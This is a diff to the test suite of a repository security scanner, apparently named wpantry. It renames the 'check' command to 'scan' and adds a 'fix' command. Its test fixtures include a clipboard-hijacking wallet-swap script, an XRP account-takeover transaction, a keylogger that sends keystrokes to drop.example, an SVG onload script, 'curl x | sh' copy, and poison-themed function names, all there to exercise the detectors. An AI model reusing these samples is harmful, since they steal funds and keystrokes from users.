@@ -78,8 +78,8 @@ class Contract(unittest.TestCase):
                            stdin=subprocess.DEVNULL, timeout=timeout)
         return p.returncode, p.stdout, p.stderr
 
-    def project_run(self, *extra):
-        return self.run_bin("--no-machine", "--path", str(self.home), "--offline", "--no-input", *extra)
+    def project_run(self, *extra, cmd="scan"):
+        return self.run_bin(cmd, "--no-machine", "--path", str(self.home), "--offline", "--no-input", *extra)
 
     def envelope(self, out: str) -> dict:
         env = json.loads(out)
@@ -126,13 +126,26 @@ class Contract(unittest.TestCase):
     # exit codes ------------------------------------------------------------
 
     def test_exit_2_on_usage_errors(self):
-        for argv in (["--bogus"], ["check", "--licenses", str(self.home / "nope.txt")], ["search"], ["export"],
-                     ["breach", "--enable", "--disable"], ["search", "x", "--limit", "many"], ["version", "extra"]):
+        for argv in (["--bogus"], ["scan", "--licenses", str(self.home / "nope.txt")], ["search"], ["export"],
+                     ["breach", "--enable", "--disable"], ["search", "x", "--limit", "many"], ["version", "extra"],
+                     ["scna"], ["fix", "--fix"]):
             code, _, err = self.run_bin(*argv)
             self.assertEqual(code, 2, argv)
             self.assertIn("usage:", err, argv)
-        self.assertEqual(self.run_bin("--help")[0], 0)
-        self.assertEqual(self.run_bin("check", "--help")[0], 0)
+        for cmd in ("scan", "check", "fix"):
+            code, out, _ = self.run_bin(cmd, "--help")
+            self.assertEqual(code, 0, cmd)
+            self.assertTrue(out.startswith(f"usage: {NAME} {cmd} [-h]"), out)
+
+    def test_no_arguments_print_the_help(self):
+        code, out, err = self.run_bin()
+        self.assertEqual(code, 0, err)
+        self.assertTrue(out.startswith(f"usage: {NAME} [-h] {{scan,check,fix,"), out)
+        self.assertEqual(self.run_bin("--help"), (code, out, err))
+        self.assertEqual(self.run_bin("-h"), (code, out, err))
+        self.assertEqual(self.run_bin("help"), (code, out, err))
+        self.assertEqual(self.run_bin("help", "fix"), self.run_bin("fix", "--help"))
+        self.assertFalse(self.db.exists(), "no scan ran")
 
     def test_exit_3_when_the_cache_cant_be_opened(self):
         # A path under a regular file can't be created on any platform.
@@ -142,7 +155,7 @@ class Contract(unittest.TestCase):
         code, _, err = self.run_bin("search", "x", env=env)
         self.assertEqual(code, 3)
         self.assertIn(f"{NAME}:", err)
-        self.assertEqual(self.run_bin("--no-machine", "--path", str(self.home), "--offline", "--json", env=env)[0], 3)
+        self.assertEqual(self.run_bin("scan", "--no-machine", "--path", str(self.home), "--offline", "--json", env=env)[0], 3)
 
     def test_exit_0_when_only_warnings_and_unchecked(self):
         code, out, _ = self.project_run()
@@ -150,7 +163,7 @@ class Contract(unittest.TestCase):
         self.assertIn("not checked", out)
         self.assertIn("Incomplete", out)
 
-    # check --json ----------------------------------------------------------
+    # scan --json ----------------------------------------------------------
 
     def test_json_envelope(self):
         git_repo(self.home / "app")
@@ -208,12 +221,12 @@ class Contract(unittest.TestCase):
 
     def test_html_dry_run_and_final_recheck(self):
         path = self.home / "report.html"
-        code, out, _ = self.project_run("--dryrun", "--html", str(path))
+        code, out, _ = self.project_run("--dryrun", "--html", str(path), cmd="fix")
         self.assertEqual(code, 0)
         self.assertEqual(self.html_bundle(path)["phase"], "before updates (dry run)")
         self.assertIn("Incomplete", out)
         # Empty, offline scope has no fixes to execute.
-        code, out, _ = self.project_run("--fix", "--html", str(path))
+        code, out, _ = self.project_run("--html", str(path), cmd="fix")
         self.assertEqual(code, 0)
         self.assertIn("Re-checking", out)
         bundle = self.html_bundle(path)
@@ -258,7 +271,7 @@ class Contract(unittest.TestCase):
         path = self.home / "report.html"
         path.write_text("previous report")
         env = dict(self.env, WPANTRY_DB="/dev/null/w.db")
-        code, _, _ = self.run_bin("--no-machine", "--path", str(self.home), "--offline", "--html", str(path), env=env)
+        code, _, _ = self.run_bin("scan", "--no-machine", "--path", str(self.home), "--offline", "--html", str(path), env=env)
         self.assertEqual(code, 3)
         self.assertEqual(path.read_text(), "previous report")
         self.assertEqual(list(self.home.glob(".wpantry-report-*.tmp")), [])
@@ -281,7 +294,7 @@ class Contract(unittest.TestCase):
         (repo / ".github" / "init.js").write_text("console.log('hi')\n")
         (repo / ".vscode").mkdir()
         (repo / ".vscode" / "tasks.json").write_text('{"version": "2.0.0", "tasks": [{"label": "fmt", "type": "shell", "command": "cargo fmt"}]}')
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         hooks = [f for f in json.loads(out)["findings"] if f["kind"] == "repo-hook"]
         self.assertEqual([h["vuln_id"] for h in hooks], ["RUNS-REPO-FILE"], hooks)
@@ -292,7 +305,7 @@ class Contract(unittest.TestCase):
         # A hook that runs an installed tool is a warning, not a failure.
         (repo / ".claude" / "settings.json").write_text(json.dumps({"hooks": {"PostToolUse": [
             {"hooks": [{"type": "command", "command": "cargo fmt"}]}]}}))
-        code, out, _ = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, _ = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         hooks = [f for f in json.loads(out)["findings"] if f["kind"] == "repo-hook"]
         self.assertEqual([(h["vuln_id"], h["status"]) for h in hooks], [("OPEN-HOOK", "warn")], hooks)
 
@@ -300,7 +313,7 @@ class Contract(unittest.TestCase):
         repo = git_repo(self.home / "mine")
         (repo / "assets").mkdir()
         (repo / "assets" / "package.json").write_text('{"name": "x", "scripts": {"postinstall": "node bin/postinstall"}}')
-        scan = ("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        scan = ("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         code, out, err = self.run_bin(*scan)
         hooks = [f for f in json.loads(out)["findings"] if f["kind"] == "repo-hook"]
         self.assertEqual([(h["vuln_id"], h["status"]) for h in hooks], [("INSTALL-HOOK", "warn")], hooks)
@@ -341,20 +354,20 @@ class Contract(unittest.TestCase):
         hooks = [f for f in json.loads(out)["findings"] if f["kind"] == "repo-hook"]
         self.assertEqual([(h["vuln_id"], h["status"]) for h in hooks], [("RUNS-REPO-FILE", "fail")], hooks)
         self.assertIn("never accepted", hooks[0]["fix_cmd"])
-        code, _, err = self.run_bin("check", "--hooks-policy", str(self.home / "missing.txt"))
+        code, _, err = self.run_bin("scan", "--hooks-policy", str(self.home / "missing.txt"))
         self.assertEqual(code, 2, err)
 
     def test_posture_flags(self):
         # Repo-only scans never report the machine's settings.
         code, out, _ = self.project_run("--json")
         self.assertFalse([f for f in json.loads(out)["findings"] if f["kind"] == "posture"])
-        code, _, err = self.run_bin("--no-machine", "--no-posture", "--no-clipboard", "--offline", "--no-input", "--path", str(self.home))
+        code, _, err = self.run_bin("scan", "--no-machine", "--no-posture", "--no-clipboard", "--offline", "--no-input", "--path", str(self.home))
         self.assertEqual(code, 0, err)
         policy = self.home / "posture.txt"
         policy.write_text("remote-login\nPOSTURE-FILEVAULT\n")
-        code, _, err = self.run_bin("--no-machine", "--posture-policy", str(policy), "--offline", "--no-input", "--path", str(self.home))
+        code, _, err = self.run_bin("scan", "--no-machine", "--posture-policy", str(policy), "--offline", "--no-input", "--path", str(self.home))
         self.assertEqual(code, 0, err)
-        code, _, err = self.run_bin("--posture-policy", str(self.home / "missing.txt"))
+        code, _, err = self.run_bin("scan", "--posture-policy", str(self.home / "missing.txt"))
         self.assertEqual(code, 2, err)
 
     def test_report_keeps_scan_history(self):
@@ -404,7 +417,7 @@ class Contract(unittest.TestCase):
         conn.commit()
         conn.close()
         unreachable = dict(self.env, HTTPS_PROXY="http://127.0.0.1:9", HTTP_PROXY="http://127.0.0.1:9")
-        code, out, err = self.run_bin("--no-machine", "--path", str(self.home), "--no-input", env=unreachable)
+        code, out, err = self.run_bin("scan", "--no-machine", "--path", str(self.home), "--no-input", env=unreachable)
         self.assertIn(code, (0, 1), err)
         self.assertIn("wpantry 99.0.0 is available", err)
         self.assertNotIn("99.0.0", out)
@@ -412,21 +425,33 @@ class Contract(unittest.TestCase):
         self.assertNotIn("99.0.0", err)
 
     def test_timings_go_to_stderr_on_request(self):
-        code, out, err = self.run_bin("--no-machine", "--path", str(self.home), "--offline", "--no-input",
+        code, out, err = self.run_bin("scan", "--no-machine", "--path", str(self.home), "--offline", "--no-input",
                                       env=dict(self.env, WPANTRY_TIMINGS="1"))
         self.assertEqual(code, 0, err)
         self.assertRegex(err, r"\[ *\d+\.\d\ds\] ")
         self.assertNotIn("s] ", out)
 
     def test_fix_with_nothing_to_apply_rechecks(self):
-        code, out, err = self.project_run("--fix")
+        code, out, err = self.project_run(cmd="fix")
         self.assertEqual(code, 0, err)
         self.assertIn("Re-checking after the updates", out)
         self.assertEqual(out.count("Incomplete"), 2, "the report, then the re-check's")
-        # --update is the old spelling and still works
-        code, out, err = self.project_run("--update")
-        self.assertEqual(code, 0, err)
-        self.assertIn("Re-checking after the updates", out)
+        # the spellings from before `fix`, kept for scripts, behave as it does
+        scope = ("--no-machine", "--path", str(self.home), "--offline", "--no-input")
+        for old in (("scan", "--fix"), ("check", "--fix"), ("--fix",), ("--update",), ("check", "--update")):
+            code, out2, err = self.run_bin(*old, *scope)
+            self.assertEqual(code, 0, (old, err))
+            self.assertEqual(out2, out, old)
+
+    def test_check_is_scan(self):
+        git_repo(self.home / "app")
+        scan = self.project_run("--json")
+        check = self.project_run("--json", cmd="check")
+        self.assertEqual(check[0], scan[0])
+        self.assertEqual(self.envelope(check[1])["findings"], self.envelope(scan[1])["findings"])
+        self.assertEqual(self.project_run(cmd="check")[0], self.project_run()[0])
+        # options with no subcommand are still the scan's
+        self.assertEqual(self.run_bin("--no-machine", "--path", str(self.home), "--offline", "--no-input")[0], scan[0])
 
     def test_schedule_dry_run_and_cache_prune(self):
         code, out, err = self.run_bin("schedule", "install", "--dry-run", "--every", "weekly", "--at", "07:05")
@@ -662,7 +687,7 @@ class Contract(unittest.TestCase):
         (repo / "clip.py").write_text("import pyperclip, re\nwhile True:\n    c = pyperclip.paste()\n    if re.match(r'^T[a-km-zA-HJ-NP-Z1-9]{33}$', c): pyperclip.copy('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')\n")
         (repo / "take.ts").write_text("import { Client } from 'xrpl';\nconst tx = { TransactionType: 'SetRegularKey', Account: a, RegularKey: mine };\nawait client.submitAndWait(tx, { wallet });\n")
         (repo / "crc.metal").write_text("constant uint T[] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20};")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
         self.assertEqual(found, [("SUSPECT-CLIPBOARD-SWAP", "fail"), ("SUSPECT-PRIV-ESCALATION", "fail"),
@@ -674,7 +699,7 @@ class Contract(unittest.TestCase):
         self.assertIn("sets a regular key that signs for the account (`SetRegularKey`, XRP Ledger)", notes["take.ts"])
         policy = self.home / "suspect.txt"
         policy.write_text("PRIV-ESCALATION\npath:index.html\nWALLET-SIGNING\nCLIPBOARD-SWAP\n")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
         findings = json.loads(out)["findings"]
         # A runner without gitleaks still fails on the missing tool: the exit follows what is left.
         fails = [f for f in findings if f["status"] == "fail"]
@@ -721,7 +746,7 @@ class Contract(unittest.TestCase):
         # Website copy that mentions sudo runs nothing: not a finding at all.
         (repo / "src").mkdir()
         (repo / "src" / "home.ts").write_text("export const copy = 'Run: sudo softwareupdate -i -a; curl x | sh';\n")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         findings = json.loads(out)["findings"]
         hidden = sorted((f["vuln_id"], f["status"]) for f in findings if f["kind"] == "hidden-text")
@@ -746,7 +771,7 @@ class Contract(unittest.TestCase):
         nm = repo / "node_modules" / "lodahs" / "build"
         nm.mkdir(parents=True)
         (nm / "helper.node").write_bytes(b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         found = sorted((f["vuln_id"], f["status"], f["component"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
         self.assertEqual([(v, s) for v, s, _ in found], [("SUSPECT-BINARY-BLOB", "warn"), ("SUSPECT-TYPOSQUAT", "fail")], found)
@@ -755,7 +780,7 @@ class Contract(unittest.TestCase):
         # The policy downgrades the typo to a warning (by id); nothing is silenced.
         policy = self.home / "squat.txt"
         policy.write_text("TYPOSQUAT\n")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
         findings = json.loads(out)["findings"]
         fails = [f for f in findings if f["status"] == "fail"]
         self.assertEqual(code, 1 if fails else 0, err)
@@ -780,7 +805,7 @@ class Contract(unittest.TestCase):
             "from pynput import keyboard\nimport requests\n"
             "def on_press(key):\n    requests.post('https://drop.example/k', data=str(key))\n"
             "keyboard.Listener(on_press=on_press).start()\n")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
         self.assertEqual(found, [
@@ -815,7 +840,7 @@ class Contract(unittest.TestCase):
         (repo / "icon.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect/></svg>')
         (repo / "photo.jpg").write_bytes(b"\xff\xd8\xff\xe0\x00\x10JFIF fine \xff\xd9")
         (repo / "notes.docx").write_bytes(b"just text, not a zip")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         findings = json.loads(out)["findings"]
         docs = sorted((f["vuln_id"], f["status"], f["component"].rsplit("/", 1)[1]) for f in findings if f["kind"] == "document")
@@ -844,7 +869,7 @@ class Contract(unittest.TestCase):
         (repo / "fp.js").write_text("function compute" + "Ricin" + "Lethal" + "DosageForWaterSupply(){}\n"
                                     "function calculate" + "Deadly" + "Lethal" + "SuicideAspirinDosage(){}\n"
                                     "function get" + "Sarin" + "NerveAgentDispersalRate(){}\n", encoding="utf-8")
-        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        code, out, err = self.run_bin("scan", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
         self.assertEqual(code, 1, err)
         findings = json.loads(out)["findings"]
         hidden = sorted((f["vuln_id"], f["status"], f["component"].rsplit("/", 1)[1]) for f in findings if f["kind"] == "hidden-text")
@@ -860,23 +885,23 @@ class Contract(unittest.TestCase):
             '"hasInstallScript": true}, "node_modules/foo": {"version": "1.0.0", "hasInstallScript": true}}}')
         allow = Path(self.tmp.name, "allow.txt")
         allow.write_text("# ours\nfoo\n")
-        _, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json")
+        _, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json")
         self.assertEqual([f["component"] for f in self.envelope(out)["findings"] if f["kind"] == "install-script"], ["foo"])
-        _, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
+        _, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
                                  str(allow))
         got = [f for f in self.envelope(out)["findings"] if f["kind"] == "install-script"]
         self.assertEqual([f["component"] for f in got], ["esbuild"])  # the bundled list allows 0.28.x; this one doesn't list it
         self.assertIn("(--install-scripts)", got[0]["fix_cmd"])
         # A pinned entry: the locked version is outside it, so it warns and names both.
         allow.write_text("# ours\nfoo\nesbuild@^0.24\n")
-        _, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
+        _, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
                                  str(allow))
         got = [f for f in self.envelope(out)["findings"] if f["kind"] == "install-script"]
         self.assertEqual([(f["component"], f["vuln_id"], f["status"]) for f in got], [("esbuild", "INSTALL-SCRIPT", "warn")])
         self.assertIn("allowed at ^0.24 but 0.28.1 is locked", got[0]["note"])
         self.assertIn("(--install-scripts)", got[0]["fix_cmd"])
         allow.write_text("# ours\nfoo\nesbuild@^0.28\n")
-        _, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
+        _, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json", "--install-scripts",
                                  str(allow))
         self.assertEqual([f for f in self.envelope(out)["findings"] if f["kind"] == "install-script"], [])
 
@@ -885,7 +910,7 @@ class Contract(unittest.TestCase):
         proj.mkdir()
         (proj / "Cargo.lock").write_text('version = 4\n\n[[package]]\nname = "itoa"\nversion = "1.0.9"\n'
                                          'source = "registry+https://github.com/rust-lang/crates.io-index"\n')
-        _, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json")
+        _, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json")
         env = self.envelope(out)
         self.assertEqual([f for f in env["findings"] if f["kind"] == "license" or "license" in f["component"]], [])
         self.assertEqual(env["unknown_licenses"], 0)
@@ -893,7 +918,7 @@ class Contract(unittest.TestCase):
         allow.write_text("MIT\n")
         for extra in (["--licenses"], ["--licenses", str(allow)], ["--licenses", "--json"], ["--license"],
                       ["--license", str(allow)]):
-            code, _, err = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--json", *extra)
+            code, _, err = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--json", *extra)
             self.assertNotEqual(code, 2, (extra, err))
 
     # scope -----------------------------------------------------------------
@@ -910,13 +935,13 @@ class Contract(unittest.TestCase):
             git_repo(h / pruned)
         outside = git_repo(Path(self.tmp.name, "outside"))
         (h / "link").symlink_to(outside)                           # symlinks are not followed
-        code, out, _ = self.run_bin("--no-machine", "--offline", "--json")
+        code, out, _ = self.run_bin("scan", "--no-machine", "--offline", "--json")
         self.assertEqual(self.envelope(out)["checked"]["git repos"], 3)
 
     def test_path_scopes_and_skips_missing_dirs(self):
         git_repo(self.home / "w" / "b")
         git_repo(self.home / "elsewhere")
-        code, out, err = self.run_bin("--no-machine", "--offline", "--json", "--path", str(self.home / "w"),
+        code, out, err = self.run_bin("scan", "--no-machine", "--offline", "--json", "--path", str(self.home / "w"),
                                       "--path", str(self.home / "missing"))
         self.assertEqual(self.envelope(out)["checked"]["git repos"], 1)
         self.assertIn("skipping --path", err)
@@ -924,7 +949,7 @@ class Contract(unittest.TestCase):
 
     def test_explicit_worktree_counts(self):
         wt = git_repo(self.home / "wt", worktree=True)
-        _, out, _ = self.run_bin("--no-machine", "--offline", "--json", "--path", str(wt))
+        _, out, _ = self.run_bin("scan", "--no-machine", "--offline", "--json", "--path", str(wt))
         self.assertEqual(self.envelope(out)["checked"]["git repos"], 1)
 
     # the cache, search, export, breach -------------------------------------
@@ -1125,7 +1150,7 @@ class Contract(unittest.TestCase):
         conn.execute("INSERT INTO queries VALUES (?, ?, ?, ?, ?)", ("npm", "ms", "2.0.0", now, ""))
         conn.commit()
         conn.close()
-        code, out, _ = self.run_bin("--no-machine", "--path", str(proj), "--offline", "--no-input", "--json")
+        code, out, _ = self.run_bin("scan", "--no-machine", "--path", str(proj), "--offline", "--no-input", "--json")
         env = self.envelope(out)
         hits = [f for f in env["findings"] if f["vuln_id"] == "CVE-2026-7"]
         self.assertEqual(len(hits), 1, env["findings"])
@@ -1268,10 +1293,10 @@ class Contract(unittest.TestCase):
 
     @unittest.skipUnless(shutil.which("git"), "no git")
     def test_dryrun_changes_nothing(self):
-        code, out, _ = self.project_run("--fix", "--dryrun")
+        code, out, _ = self.project_run("--dryrun", cmd="fix")
         self.assertIn(code, (0, 1))
         self.assertNotIn("Re-checking", out)
-        # mitigate all is check --fix with the same flags
+        # mitigate all is fix with the same flags
         code, out2, _ = self.run_bin("mitigate", "all", "--dry-run", "--no-machine", "--path", str(self.home), "--offline", "--no-input")
         self.assertIn(code, (0, 1))
         self.assertNotIn("Re-checking", out2)
